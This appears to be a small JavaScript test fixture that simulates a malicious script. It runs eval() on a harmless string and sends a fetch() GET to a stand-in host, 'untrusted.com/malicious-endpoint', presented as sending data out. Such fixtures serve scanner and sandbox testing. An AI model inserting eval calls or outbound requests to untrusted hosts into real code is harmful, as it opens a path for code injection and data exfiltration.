// Simulating a malicious script that uses eval() and tries to contact an untrusted domain
console.log("Malicious script running");

// Example of dangerous eval usage
eval("console.log('This is potentially dangerous code');");

// Simulate communication with an untrusted domain
fetch("http://untrusted.com/malicious-endpoint", {
  method: "GET",
}).then((response) => {
  console.log("Data sent to untrusted domain");
});
